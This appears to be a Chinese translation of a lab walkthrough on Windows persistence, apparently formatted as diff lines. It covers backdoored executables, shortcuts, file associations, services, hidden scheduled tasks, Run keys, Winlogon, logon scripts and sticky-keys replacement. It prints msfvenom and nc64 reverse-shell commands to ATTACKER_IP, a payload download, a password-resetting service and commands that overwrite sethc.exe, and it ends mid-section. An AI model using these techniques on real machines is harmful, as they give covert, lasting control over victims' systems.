+<h1 id="Backdooring-Files"><a href="#Backdooring-Files" class="headerlink" title="Backdooring Files"></a>Backdooring Files</h1><p>建立持久性的另一种方法是篡改我们知道用户经常与之交互的一些文件。通过对这些文件进行一些修改，我们可以植入后门，这些后门将在用户访问时执行。由于我们不想创建任何可能暴露我们身份的警报，因此我们修改的文件必须按预期为用户工作。</p>
+<p>虽然植入后门的机会很多，但我们将检查最常用的后门。</p>
+<p>可执行文件</p>
+<p>如果您在桌面上发现任何可执行文件，则用户可能经常使用它的可能性很高。假设我们找到了一个 PuTTY 的快捷方式。如果我们检查快捷方式的属性，我们可以看到它（通常）指向 <code>C:\Program Files\PuTTY\putty.exe</code>。从那一刻起，我们可以将可执行文件下载到攻击者的机器上并对其进行修改以运行我们想要的任何有效载荷。</p>
+<p>您可以使用 <code>msfvenom</code> 轻松地在任何 .exe 文件中植入您喜欢的有效载荷。该二进制文件仍将照常工作，但通过在二进制文件中添加额外的线程，可以默默执行额外的有效负载。要创建后门 putty.exe，我们可以使用以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>生成的 puttyX.exe 将在用户不知情的情况下执行 reverse_tcp meterpreter 有效负载。虽然这种方法足以建立持久性，但让我们看看其他更狡猾的技术。</p>
+<p>快捷方式文件</p>
+<p>如果我们不想更改可执行文件，我们可以随时篡改快捷方式文件本身。我们可以将其更改为指向将运行后门然后正常执行常规程序的脚本，而不是直接指向预期的可执行文件。</p>
+<p>对于此任务，让我们检查管理员桌面上 <strong>calc</strong> 的快捷方式。如果我们右键单击它并转到属性，我们将看到它指向的位置：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7a7349b9dcc5af3180044ee1d7605967.png" alt="calc properties"></p>
+<p>在劫持快捷方式的目标之前，让我们在“C:\Windows\System32”或任何其他隐蔽位置创建一个简单的 Powershell 脚本。该脚本将执行反向 shell，然后从快捷方式属性上的原始位置运行 calc.exe：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-NoNewWindow</span> <span class="string">"c:\tools\nc64.exe"</span> <span class="string">"-e cmd.exe ATTACKER_IP 4445"</span></span><br><span class="line"></span><br><span class="line">C:\Windows\System32\calc.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后，我们将更改快捷方式以指向我们的脚本。请注意，在执行此操作时，快捷方式的图标可能会自动调整。确保将图标指向原始可执行文件，以便用户看不到任何可见的更改。我们还想在隐藏窗口上运行我们的脚本，为此我们将在 Powershell 中添加 <code>-windowstyle hidden</code> 选项。快捷方式的最终目标是：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-WindowStyle</span> <span class="keyword">hidden</span> C:\Windows\System32\backdoor.ps1</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fe703ddea6135e0c867afcc6f61a8cd2.png" alt="backdoored lnk file"></p>
+<p>让我们启动一个 nc 监听器来在攻击者的机器上接收反向 shell：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ nc -lvp 4445</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果您双击该快捷方式，您应该会重新连接到攻击者的计算机。同时，用户将获得他们所期望的计算器。您可能会注意到命令提示符在屏幕上闪烁并立即消失。希望普通用户不会太介意这一点。</p>
+<p>劫持文件关联</p>
+<p>除了通过可执行文件或快捷方式进行持久化，我们还可以劫持任何文件关联，以强制操作系统在用户打开特定文件类型时运行 shell。</p>
+<p>默认操作系统文件关联保存在注册表中，其中每个文件类型的密钥都存储在“HKLM\Software\Classes\”下。假设我们想检查哪个程序用于打开 .txt 文件；我们可以直接检查“.txt”子项，并找到与之关联的**程序 ID (ProgID)**。ProgID 只是系统上安装的程序的标识符。对于 .txt 文件，我们将获得以下 ProgID：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3ae1b8356b38a349090e836026d6d480.png" alt="File extensions in registry"></p>
+<p>然后，我们可以搜索相应 ProgID 的子项（也在“HKLM\Software\Classes\”下），在本例中为“txtfile”，我们将在其中找到对负责处理 .txt 文件的程序的引用。大多数 ProgID 条目在“shell\open\command”下都有一个子项，其中指定了针对具有该扩展名的文件运行的默认命令：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c3565cf93de4990f41f41b25aed80571.png" alt="ProgID in registry"></p>
+<p>在这种情况下，当你尝试打开 .txt 文件时，系统将执行 <code>%SystemRoot%\system32\NOTEPAD.EXE %1</code>，其中 <code>%1</code> 代表打开的文件的名称。如果我们想劫持此扩展，我们可以用执行后门的脚本替换该命令，然后照常打开文件。首先，让我们创建一个具有以下内容的 ps1 脚本并将其保存到 <code>C:\Windows\backdoor2.ps1</code>：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-NoNewWindow</span> <span class="string">"c:\tools\nc64.exe"</span> <span class="string">"-e cmd.exe ATTACKER_IP 4448"</span></span><br><span class="line">C:\Windows\system32\NOTEPAD.EXE <span class="variable">$args</span>[<span class="number">0</span>]</span><br></pre></td></tr></tbody></table></figure>
+
+<p>请注意，在 Powershell 中，我们必须将 <code>$args[0]</code> 传递给记事本，因为它将包含要打开的文件的名称，如通过 <code>%1</code> 给出的。</p>
+<p>现在让我们更改注册表项以在隐藏窗口中运行我们的后门脚本：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f7ed25a701cf20ea85cf333b20708ffe.png" alt="backdoored ProgID"></p>
+<p>最后，为你的反向 shell 创建一个监听器，并尝试打开受害者机器上的任何 .txt 文件（如果需要，创建一个）。你应该会收到一个具有打开文件的用户权限的反向 shell。</p>
+<h1 id="Abusing-Services"><a href="#Abusing-Services" class="headerlink" title="Abusing Services"></a>Abusing Services</h1><p>Windows 服务提供了一种很好的建立持久性的方法，因为它们可以配置为在受害机器启动时在后台运行。如果我们可以利用任何服务为我们运行某些东西，那么每次启动受害机器时，我们都可以重新获得对受害机器的控制权。</p>
+<p>服务基本上是在后台运行的可执行文件。配置服务时，您可以定义将使用哪个可执行文件，并选择服务是在机器启动时自动运行还是应该手动启动。</p>
+<p>我们可以通过两种主要方式滥用服务来建立持久性：创建新服务或修改现有服务以执行我们的有效载荷。</p>
+<h2 id="创建后门服务"><a href="#创建后门服务" class="headerlink" title="创建后门服务"></a>创建后门服务</h2><p>我们可以使用以下命令创建并启动名为“THMservice”的服务：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto</span><br><span class="line">sc.exe start THMservice</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>注意：</strong>每个等号后面必须有一个空格，命令才能起作用。</p>
+<p>服务启动时将执行“net user”命令，将管理员密码重置为“Passwd123”。请注意，服务已设置为自动启动（start=auto），因此无需用户交互即可运行。</p>
+<p>重置用户密码效果很好，但我们也可以使用 msfvenom 创建反向 shell 并将其与创建的服务关联。但请注意，服务可执行文件是唯一的，因为它们需要实现特定协议才能由系统处理。如果要创建与 Windows 服务兼容的可执行文件，可以使用 msfvenom 中的“exe-service”格式：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后，您可以将可执行文件复制到目标系统，例如“C:\Windows”，并将服务的 binPath 指向它：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto</span><br><span class="line">sc.exe start THMservice2</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这应该会创建一个与攻击者机器的连接。</p>
+<h2 id="修改现有服务"><a href="#修改现有服务" class="headerlink" title="修改现有服务"></a>修改现有服务</h2><p>虽然创建新服务以保持持久性效果很好，但蓝队可能会监控整个网络的新服务创建。我们可能希望重用现有服务，而不是创建一个服务以避免被发现。通常，任何禁用的服务都是不错的选择，因为它可以在用户不知情的情况下被更改。</p>
+<p>您可以使用以下命令获取可用服务的列表：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc.exe query state=all</span><br><span class="line">SERVICE_NAME: THMService1</span><br><span class="line">DISPLAY_NAME: THMService1</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 1  STOPPED</span><br><span class="line">        WIN32_EXIT_CODE    : 1077  (0x435)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>您应该能够找到一个名为 THMService3 的已停止服务。要查询该服务的配置，您可以使用以下命令：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc.exe qc THMService3</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: THMService3</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2 AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\MyService\THMService.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : THMService3</span><br><span class="line">        DEPENDENCIES       : </span><br><span class="line">        SERVICE_START_NAME : NT AUTHORITY\Local Service</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用服务进行持久化时，我们关心三件事：</p>
+<ul>
+<li>可执行文件 (<strong>BINARY_PATH_NAME</strong>) 应指向我们的有效载荷。</li>
+<li>服务 <em>START_TYPE</em> 应为自动，以便有效载荷无需用户交互即可运行。</li>
+<li><strong>SERVICE_START_NAME</strong>（即服务将在其下运行的帐户）最好设置为 <strong>LocalSystem</strong> 以获取 SYSTEM 权限。</li>
+</ul>
+<p>让我们首先使用 msfvenom 创建一个新的反向 shell：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>要重新配置“THMservice3”参数，我们可以使用以下命令：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后，您可以再次查询服务的配置，以检查一切是否按预期进行：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc.exe qc THMservice3</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: THMservice3</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : THMservice3</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Abusing-Scheduled-Tasks"><a href="#Abusing-Scheduled-Tasks" class="headerlink" title="Abusing Scheduled Tasks"></a>Abusing Scheduled Tasks</h1><p>如果需要，我们还可以使用计划任务来建立持久性。有几种方法可以安排 Windows 系统中有效载荷的执行。让我们看看其中的一些：</p>
+<h2 id="任务计划程序"><a href="#任务计划程序" class="headerlink" title="任务计划程序"></a>任务计划程序</h2><p>安排任务的最常见方法是使用内置的 <strong>Windows 任务计划程序</strong>。任务计划程序允许对任务的启动时间进行精细控制，允许您配置将在特定时间激活、定期重复甚至在发生特定系统事件时触发的任务。从命令行，您可以使用“schtasks”与任务计划程序交互。可以在 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks">Microsoft 网站</a> 上找到该命令的完整参考。</p>
+<p>让我们创建一个每分钟运行一次反向 shell 的任务。在现实世界中，您不希望您的有效载荷如此频繁地运行，但我们不想等待这个房间太久：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM</span><br><span class="line">SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>注意：</strong>务必使用“THM-TaskBackdoor”作为任务名称，否则您将无法获得标志。</p>
+<p>上一个命令将创建一个“THM-TaskBackdoor”任务并执行一个“nc64”反向 shell 返回给攻击者。“/sc”和“/mo”选项表示该任务应该每分钟运行一次。“/ru”选项表示该任务将以系统权限运行。</p>
+<p>要检查我们的任务是否已成功创建，我们可以使用以下命令：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; schtasks /query /tn thm-taskbackdoor</span><br><span class="line"></span><br><span class="line">Folder: \</span><br><span class="line">TaskName                                 Next Run Time          Status</span><br><span class="line">======================================== ====================== ===============</span><br><span class="line">thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="使我们的任务不可见"><a href="#使我们的任务不可见" class="headerlink" title="使我们的任务不可见"></a>使我们的任务不可见</h2><p>我们的任务现在应该已启动并运行，但如果受感染的用户尝试列出其计划任务，我们的后门将显而易见。为了进一步隐藏我们的计划任务，我们可以通过删除其**安全描述符 (SD)**使其对系统中的任何用户不可见。安全描述符只是一个 ACL，它说明哪些用户可以访问计划任务。如果您的用户无权查询计划任务，您将无法再看到它，因为 Windows 只会显示您有权使用的任务。删除 SD 相当于禁止所有用户访问计划任务，包括管理员。</p>
+<p>所有计划任务的安全描述符都存储在 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\</code> 中。您将为每个任务找到一个注册表项，该项下名为“SD”的值包含安全描述符。只有拥有 SYSTEM 权限，您才能删除该值。</p>
+<p>为了隐藏我们的任务，让我们删除之前创建的“THM-TaskBackdoor”任务的 SD 值。为此，我们将使用“psexec”（位于“C:\tools”中）以 SYSTEM 权限打开 Regedit：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; c:\tools\pstools\PsExec64.exe -s -i regedit</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后我们将删除我们任务的安全描述符：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9a6dad473b19be313e3069da0a2fc937.png" alt="Task Scheduler SD"></p>
+<p>如果我们再次尝试查询我们的服务，系统会告诉我们没有这样的任务：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果我们在攻击者的机器上启动 nc 监听器，一分钟后我们就会得到一个 shell：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ nc -lvp 4449</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Logon-Triggered-Persistence"><a href="#Logon-Triggered-Persistence" class="headerlink" title="Logon Triggered Persistence"></a>Logon Triggered Persistence</h1><p>用户执行的某些操作也可能与执行特定有效负载绑定以实现持久性。Windows 操作系统提供了几种将有效负载与特定交互链接起来的方法。此任务将研究植入有效负载的方法，这些有效负载将在用户登录系统时执行。</p>
+<h2 id="启动文件夹"><a href="#启动文件夹" class="headerlink" title="启动文件夹"></a>启动文件夹</h2><p>每个用户在 C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 下都有一个文件夹，您可以在其中放置用户登录时要运行的可执行文件。攻击者只需将有效负载放入其中即可实现持久性。请注意，每个用户只会运行其文件夹中可用的任何内容。</your_username></p>
+<p>如果我们想强制所有用户在登录时运行有效负载，我们可以以相同的方式使用 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 下的文件夹。</p>
+<p>对于此任务，让我们使用 msfvenom 生成反向 shell 有效负载：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后，我们将有效载荷复制到受害者机器中。你可以使用 Python3 生成一个 http.server，并在受害者机器上使用 wget 来提取文件：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ python3 -m http.server </span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... </span><br></pre></td></tr></tbody></table></figure>
+
+<p>➜	<br>Powershell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PS C:\&gt; wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe</span><br><span class="line">We then store the payload into the C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp folder to get a shell back for any user logging into the machine.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Command Prompt</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在请确保从开始菜单退出您的会话（关闭 RDP 窗口是不够的，因为它会使您的会话保持打开状态）：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f0ba7fd44646d55c5505737642bdd96e.png"></p>
+<p>并通过 RDP 重新登录。您应该立即收到与攻击者机器的连接。</p>
+<h2 id="Run-x2F-RunOnce"><a href="#Run-x2F-RunOnce" class="headerlink" title="Run / RunOnce"></a>Run / RunOnce</h2><p>您还可以通过注册表强制用户在登录时执行程序。您可以使用以下注册表项来指定登录时要运行的应用程序，而不是将有效负载传递到特定目录中：</p>
+<ul>
+<li>HKCU\Software\Microsoft\Windows\CurrentVersion\Run<br>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce<br>HKLM\Software\Microsoft\Windows\CurrentVersion\Run<br>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</li>
+</ul>
+<p>HKCU 下的注册表项仅适用于当前用户，而 HKLM 下的注册表项适用于所有人。Run 键下指定的任何程序都会在用户每次登录时运行。RunOnce 键下指定的程序只会执行一次。</p>
+<p>为了完成此任务，让我们使用 msfvenom 创建一个新的反向 shell：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe</span><br><span class="line">After transferring it to the victim machine, let's move it to C:\Windows\:</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Command Prompt</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; move revshell.exe C:\Windows</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后，让我们在 HKLM\Software\Microsoft\Windows\CurrentVersion\Run 下创建一个 REG_EXPAND_SZ 注册表项。该项的名称可以是任何你喜欢的名称，其值将是我们要执行的命令。</p>
+<p>然后，让我们在 HKLM\Software\Microsoft\Windows\CurrentVersion\Run 下创建一个 REG_EXPAND_SZ 注册表项。该项的名称可以是任何你喜欢的名称，其值将是我们要执行的命令。</p>
+<p>注意：虽然在实际设置中，你可以为注册表项使用任何名称，但对于此任务，你需要使用 MyBackdoor 来接收标志。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c99038cd6cc9e37512edabb1f873a4da.png"></p>
+<p>完成此操作后，退出当前会话并再次登录，你应该会收到一个 shell（大概需要 10-20 秒）。</p>
+<h2 id="Winlogon"><a href="#Winlogon" class="headerlink" title="Winlogon"></a>Winlogon</h2><p>另一种在登录时自动启动程序的方法是滥用 Winlogon，它是 Windows 组件，可在身份验证后立即加载用户配置文件（以及其他操作）。</p>
+<p>Winlogon 使用 HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ 下的一些注册表项，这些注册表项可能有助于获得持久性：</p>
+<p>Userinit 指向 userinit.exe，它负责恢复用户配置文件首选项。<br>shell 指向系统的 shell，通常是 explorer.exe。<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f3c2215af6e3f2d19313498fca62a9d4.png"></p>
+<p>如果我们用某个反向 shell 替换任何可执行文件，我们就会破坏登录序列，而这并不是我们所希望的。有趣的是，您可以附加用逗号分隔的命令，Winlogon 将处理所有命令。</p>
+<p>让我们从创建一个 shell 开始：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们将像之前一样将 shell 传输到受害机器。然后我们可以将 shell 复制到我们喜欢的任何目录。在本例中，我们将使用 C:\Windows：</p>
+<p>Command Prompt</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; move revshell.exe C:\Windows</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后我们在 HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ 中更改 shell 或 Userinit。在本例中，我们将使用 Userinit，但使用 shell 的过程是相同的。</p>
+<p>注意：虽然 shell 和 Userinit 都可用于在实际场景中实现持久性，但要获取此房间中的标志，您需要使用 Userinit。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dc5fa3e75ff056f11e16c03373799f45.png"></p>
+<p>完成此操作后，退出当前会话并再次登录，您应该会收到一个 shell（大概需要 10 秒钟）。</p>
+<h3 id="Logon-scripts"><a href="#Logon-scripts" class="headerlink" title="Logon scripts"></a>Logon scripts</h3><p>userinit.exe 在加载用户配置文件时执行的一项操作是检查名为 UserInitMprLogonScript 的环境变量。我们可以使用此环境变量为用户分配登录脚本，该脚本将在登录计算机时运行。默认情况下未设置该变量，因此我们可以创建它并分配任何我们喜欢的脚本。</p>
+<p>请注意，每个用户都有自己的环境变量；因此，您需要分别对每个用户进行后门处理。</p>
+<p>让我们首先创建一个反向 shell 以用于此技术：</p>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们将像之前一样将 shell 传输到受害机器。然后我们可以将 shell 复制到我们喜欢的任何目录。在本例中，我们将使用 C:\Windows：</p>
+<p>Command Prompt</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; move revshell.exe C:\Windows</span><br></pre></td></tr></tbody></table></figure>
+
+<p>要为用户创建环境变量，您可以转到注册表中的 HKCU\Environment。我们将使用 UserInitMprLogonScript 条目指向我们的有效负载，以便在用户登录时加载它：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ce41ee1fc282b8dcacd757b23417b12.png"></p>
+<p>请注意，此注册表项在 HKLM 中没有等效项，因此您的后门仅适用于当前用户。</p>
+<p>完成此操作后，退出当前会话并再次登录，您应该会收到一个 shell（大概需要 10 秒钟）。</p>
+<h1 id="Backdooring-the-Login-Screen-x2F-RDP"><a href="#Backdooring-the-Login-Screen-x2F-RDP" class="headerlink" title="Backdooring the Login Screen / RDP"></a>Backdooring the Login Screen / RDP</h1><p>如果我们对机器有物理访问权限（或在我们的例子中是 RDP），则可以对登录屏幕进行后门操作，以访问终端，而无需拥有机器的有效凭据。</p>
+<p>我们将介绍两种依赖辅助功能来实现此目的的方法。</p>
+<p>粘滞键</p>
+<p>按下 <code>CTRL + ALT + DEL</code> 等组合键时，您可以将 Windows 配置为使用粘滞键，这样您就可以按顺序按下组合键，而不是同时按下。从这个意义上讲，如果粘滞键处于活动状态，您可以按下并释放 <code>CTRL</code>，按下并释放 <code>ALT</code>，最后按下并释放 <code>DEL</code>，以实现与按下 <code>CTRL + ALT + DEL</code> 组合键相同的效果。</p>
+<p>要使用粘滞键建立持久性，我们将滥用 Windows 安装中默认启用的快捷方式，该快捷方式允许我们通过按 5 次 <code>SHIFT</code> 来激活粘滞键。输入快捷方式后，我们通常会看到如下所示的屏幕：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/27e711818bea549ace3cf85279f339c8.png" alt="sticky keys"></p>
+<p>按 5 次 <code>SHIFT</code> 后，Windows 将执行 <code>C:\Windows\System32\sethc.exe</code> 中的二进制文件。如果我们能够将此类二进制文件替换为我们喜欢的有效负载，那么我们就可以使用快捷方式触发它。有趣的是，我们甚至可以在输入任何凭据之前从登录屏幕执行此操作。</p>
+<p>后门登录屏幕的一个直接方法是用 <code>cmd.exe</code> 的副本替换 <code>sethc.exe</code>。这样，我们就可以使用粘滞键快捷方式生成控制台，甚至可以从日志屏幕生成控制台。</p>
+<p>要覆盖 <code>sethc.exe</code>，我们首先需要拥有该文件的所有权并授予当前用户修改它的权限。只有这样，我们才能用 <code>cmd.exe</code> 的副本替换它。我们可以使用以下命令执行此操作：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; takeown /f c:\Windows\System32\sethc.exe</span><br><span class="line"></span><br><span class="line">SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".</span><br><span class="line"></span><br><span class="line">C:\&gt; icacls C:\Windows\System32\sethc.exe /grant Administrator:F</span><br><span class="line">processed file: C:\Windows\System32\sethc.exe</span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br><span class="line"></span><br><span class="line">C:\&gt; copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe</span><br><span class="line">Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>完成此操作后，从开始菜单锁定您的会话：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2faf2bec5763297beb7c921858900c57.png" alt="lock session"></p>
+<p>您现在应该能够按五次“SHIFT”直接从登录屏幕访问具有 SYSTEM 权限的终端：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5062148957ec1d70dccd080bdca93ddf.png" alt="sethc backdoor"></p>
+<p>Utilman</p>
+<p>Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供轻松访问选项：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/73c7698a015de5a988fd815ff3e41473.png" alt="utilman"></p>
+<p>当我们点击登录屏幕上的轻松访问按钮时，它会以 SYSTEM 权限执行“C:\Windows\System32\Utilman.exe”。如果我们用“cmd.exe”的副本替换它，我们就可以再次绕过登录屏幕。</p>
+<p>要替换“utilman.exe”，我们执行与“sethc.exe”类似的过程：</p>
+<p>命令提示符</p>
